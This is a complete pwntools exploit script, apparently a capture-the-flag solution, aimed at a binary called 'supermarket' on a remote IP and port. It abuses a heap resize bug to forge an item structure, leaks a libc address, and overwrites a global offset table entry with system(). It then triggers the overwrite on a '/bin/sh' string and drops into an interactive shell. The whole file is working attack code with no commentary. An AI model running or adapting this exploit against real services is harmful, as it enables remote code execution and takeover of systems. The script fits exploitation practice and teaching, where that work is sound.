#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./supermarket"
ENV = {"LD_PRELOAD":"./libc.so.6"}

#p = process(elf)
p = remote("117.78.43.127", 31925)

def add(name, price, size, s):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("price:")
    p.sendline(str(price))
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(s)

def delete(name):
    p.recvuntil("your choice>> ")
    p.sendline("2")
    p.recvuntil("name:")
    p.sendline(name)

def dump():
    p.recvuntil("your choice>> ")
    p.sendline("3")

def editp():
    p.recvuntil("your choice>> ")
    p.sendline("4")

def editd(name, size, s):
    p.recvuntil("your choice>> ")
    p.sendline("5")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(s)


add("A", 0, 0x9c, "A"*0x9a)
add("B", 0, 0x1c, "/bin/sh")
editd("A", 0x100, "")
add("C", 0, 0x1c, "C"*0x1a)

payload = p32(0x43)
payload += p8(0)*0x10
payload += p32(0x1c)
payload += p32(0x804b010)
payload += p8(0x21)
editd("A", 0x9c, payload)

dump()
p.recvuntil("C: price.0, des.")
libc_base = u32(p.recv(4))-0xd4350
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+0x3a940

payload = p32(0x43)
payload += p8(0)*0x10
payload += p32(0x1c)
payload += p32(0x804b024)
payload += p8(0x21)
editd("A", 0x9c, payload)

editd("C", 0x1c, p32(system_addr))

p.recvuntil("your choice>> ")
p.sendline("5")
p.recvuntil("name:")
p.sendline("B")
p.recvuntil("descrip_size:")
p.sendline(str(0x100))

p.interactive()
